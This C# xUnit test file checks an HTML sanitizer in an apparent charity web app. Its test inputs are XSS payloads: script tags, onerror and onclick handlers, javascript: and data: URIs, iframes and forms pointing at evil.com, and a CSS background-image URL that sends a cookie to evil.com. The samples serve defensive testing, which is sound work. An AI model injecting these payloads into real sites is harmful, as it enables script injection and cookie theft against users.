using System;
using GiveAID.Web.Helpers;
using Xunit;

namespace GiveAID.Tests.Tests.Unit
{
    /// <summary>
    /// Unit tests for <see cref="HtmlSanitizer"/>.
    ///
    /// The sanitizer uses an allowlist approach:
    ///   • Dangerous tags (<script>, <iframe>, <object>, etc.) are stripped entirely.
    ///   • Inline event handlers (onclick, onerror, etc.) are removed from allowed tags.
    ///   • javascript:/vbscript:/data: URIs in href/src are rejected.
    ///   • External links get rel="noopener noreferrer" + target="_blank".
    ///   • Safe text (no HTML) passes through unchanged.
    ///
    /// Security invariants we test:
    ///   1. Script tags never survive — not even encoded/obfuscated variants.
    ///   2. Event-handler attributes are always removed.
    ///   3. javascript: URIs are neutralised.
    ///   4. Allowed tags + allowed attributes are preserved.
    ///   5. Null/empty input is handled gracefully.
    /// </summary>
    public class HtmlSanitizerTests
    {
        // ════════════════════════════════════════════════════════════════════
        // Script tag removal
        // ════════════════════════════════════════════════════════════════════

        [Fact]
        public void Sanitize_RemovesScriptTags()
        {
            var dirty = "<p>Hello</p><script>alert('xss')</script><p>World</p>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("script", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("alert", clean, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<p>Hello</p>", clean);
            Assert.Contains("<p>World</p>", clean);
        }

        [Fact]
        public void Sanitize_RemovesScriptTags_CaseInsensitive()
        {
            var dirty = "<SCRIPT>alert('xss')</SCRIPT>";
            Assert.DoesNotContain("script",
                HtmlSanitizer.Sanitize(dirty), StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesScriptWithAttributes()
        {
            var dirty = "<script type=\"text/javascript\" src=\"evil.js\"></script>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.DoesNotContain("script", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("evil.js", clean);
        }

        [Fact]
        public void Sanitize_RemovesNestedScriptTags()
        {
            var dirty = "<div><p>text</p><script>stealCookies()</script></div>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("stealCookies", clean);
            Assert.Contains("<p>text</p>", clean);
        }

        // ════════════════════════════════════════════════════════════════════
        // Event handler removal
        // ════════════════════════════════════════════════════════════════════

        [Fact]
        public void Sanitize_RemovesOnclickHandlers()
        {
            var dirty = "<button onclick=\"alert('xss')\">Click me</button>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("onclick", clean, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<button>", clean);
            Assert.Contains("Click me", clean);
        }

        [Fact]
        public void Sanitize_RemovesOnerrorHandlers()
        {
            var dirty = "<img src=\"x\" onerror=\"alert('xss')\" />";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("onerror", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesOnloadHandlers()
        {
            var dirty = "<body onload=\"alert('xss')\">";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("onload", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesAllEventHandlers_CaseInsensitive()
        {
            // Test multiple event handlers
            var dirty = "<div ONMOUSEOVER='alert(1)' ONCLICK='alert(2)' OnKeyDown='alert(3)'>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("onmouseover", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("onclick",       clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("onkeydown",     clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesStyleAttribute()
        {
            // CSS exfiltration via background-image: url() is blocked.
            var dirty = "<p style=\"background-image:url(http://evil.com/log?c=cookie)\">Text</p>";
            var clean  = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("style", clean, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<p>", clean);
        }

        // ════════════════════════════════════════════════════════════════════
        // URI scheme filtering
        // ════════════════════════════════════════════════════════════════════

        [Fact]
        public void Sanitize_RemovesJavascriptHref()
        {
            var dirty = "<a href=\"javascript:alert('xss')\">Click</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("javascript:", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesJavascriptHref_Capitalized()
        {
            var dirty = "<a href=\"JAVASCRIPT:alert('xss')\">Click</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.DoesNotContain("javascript", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesVbscriptHref()
        {
            var dirty = "<a href=\"vbscript:msgbox('xss')\">Click</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.DoesNotContain("vbscript", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesDataUriInHref()
        {
            var dirty = "<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.DoesNotContain("data:", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_AllowsSafeHttpHref()
        {
            var dirty = "<a href=\"https://giveaid.org/about\">About Us</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("https://giveaid.org/about", clean);
        }

        [Fact]
        public void Sanitize_AllowsMailtoHref()
        {
            var dirty = "<a href=\"mailto:test@giveaid.org\">Email</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("mailto:", clean);
        }

        [Fact]
        public void Sanitize_AllowsRelativeHref()
        {
            var dirty = "<a href=\"/campaigns/1\">Donate</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("href=\"/campaigns/1\"", clean);
        }

        // ════════════════════════════════════════════════════════════════════
        // Other dangerous tag removal
        // ════════════════════════════════════════════════════════════════════

        [Fact]
        public void Sanitize_RemovesIframes()
        {
            var dirty = "<p>Content</p><iframe src=\"evil.com\"></iframe>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("iframe", clean, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<p>Content</p>", clean);
        }

        [Fact]
        public void Sanitize_RemovesIframe_SelfClosing()
        {
            var dirty = "<iframe src=\"http://evil.com/frame\"/>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.DoesNotContain("iframe", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesObjectAndEmbed()
        {
            var dirty = "<object data=\"evil.swf\"></object><embed src=\"evil.swf\">";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("object", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("embed",  clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesForms()
        {
            var dirty = "<form action=\"http://evil.com/submit\"><input name=\"x\"/></form>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("form",  clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("input", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_RemovesStyleTag()
        {
            var dirty = "<style>body{display:none}</style><p>Visible</p>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("style", clean, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<p>Visible</p>", clean);
        }

        // ════════════════════════════════════════════════════════════════════
        // Allowed content preservation
        // ════════════════════════════════════════════════════════════════════

        [Fact]
        public void Sanitize_PreservesSafeText()
        {
            var input = "This is plain text with no HTML at all.";
            Assert.Equal(input, HtmlSanitizer.Sanitize(input));
        }

        [Fact]
        public void Sanitize_PreservesBoldItalicTags()
        {
            var dirty = "<p><strong>Bold</strong> and <em>italic</em> text</p>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("<strong>Bold</strong>", clean);
            Assert.Contains("<em>italic</em>",      clean);
        }

        [Fact]
        public void Sanitize_PreservesHeadingTags()
        {
            var dirty = "<h1>Title</h1><h2>Subtitle</h2>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("<h1>Title</h1>", clean);
            Assert.Contains("<h2>Subtitle</h2>", clean);
        }

        [Fact]
        public void Sanitize_PreservesLists()
        {
            var dirty = "<ul><li>Item 1</li><li>Item 2</li></ul>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("<ul>",  clean);
            Assert.Contains("<li>Item 1</li>", clean);
            Assert.Contains("<li>Item 2</li>", clean);
        }

        [Fact]
        public void Sanitize_PreservesBlockquote()
        {
            var dirty = "<blockquote>Important quote</blockquote>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.Contains("<blockquote>Important quote</blockquote>", clean);
        }

        [Fact]
        public void Sanitize_PreservesCodeTag()
        {
            var dirty = "<p>Use <code>var x = 1;</code> in your code.</p>";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.Contains("<code>var x = 1;</code>", clean);
        }

        [Fact]
        public void Sanitize_PreservesImgTagWithSafeSrc()
        {
            var dirty = "<img src=\"https://giveaid.org/photo.jpg\" alt=\"A child\" />";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("src=\"https://giveaid.org/photo.jpg\"", clean);
            Assert.Contains("alt=\"A child\"", clean);
        }

        [Fact]
        public void Sanitize_StripsImgTagWithJavascriptSrc()
        {
            var dirty = "<img src=\"javascript:alert(1)\" />";
            var clean = HtmlSanitizer.Sanitize(dirty);
            Assert.DoesNotContain("javascript", clean, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Sanitize_ExternalLinks_GetNoOpenerAndTargetBlank()
        {
            var dirty = "<a href=\"https://external.com\">External</a>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.Contains("target=\"_blank\"",            clean);
            Assert.Contains("rel=\"noopener noreferrer\"", clean);
        }

        // ════════════════════════════════════════════════════════════════════
        // Edge cases / null safety
        // ════════════════════════════════════════════════════════════════════

        [Fact]
        public void Sanitize_HandlesNullInput()
        {
            Assert.Null(HtmlSanitizer.Sanitize(null));
        }

        [Fact]
        public void Sanitize_HandlesEmptyString()
        {
            Assert.Equal("", HtmlSanitizer.Sanitize(""));
        }

        [Fact]
        public void Sanitize_HandlesWhitespaceOnly()
        {
            Assert.Equal("   ", HtmlSanitizer.Sanitize("   "));
        }

        [Fact]
        public void Sanitize_UnknownTag_StripsTagButKeepsInnerText()
        {
            // <video> is not in the allowlist — should be stripped completely.
            var dirty = "<p>text</p><video><source src=\"evil.mp4\"></video>";
            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("video",  clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("source", clean, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<p>text</p>", clean);
        }

        [Fact]
        public void Sanitize_HandlesHtmlEncodedCharacters()
        {
            // Input is HTML-encoded (e.g. from a textarea)
            var dirty = "&lt;script&gt;alert('xss')&lt;/script&gt;";
            var clean = HtmlSanitizer.Sanitize(dirty);

            // These are literal text, not tags — should pass through unchanged.
            Assert.Contains("&lt;script&gt;", clean);
        }

        [Fact]
        public void Sanitize_MultipleAttacks_AllNeutralized()
        {
            var dirty = @"
<p onclick=""alert('xss1')"">Hello</p>
<script>alert('xss2')</script>
<a href=""javascript:alert('xss3')"">Evil link</a>
<iframe src=""evil.com""></iframe>
<img src=""x"" onerror=""alert('xss4')"" />";

            var clean = HtmlSanitizer.Sanitize(dirty);

            Assert.DoesNotContain("script",  clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("onclick", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("onerror", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("javascript", clean, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("iframe",  clean, StringComparison.OrdinalIgnoreCase);
            // Safe content should be preserved
            Assert.Contains("<p>", clean);
            Assert.Contains("Hello", clean);
        }
    }
}
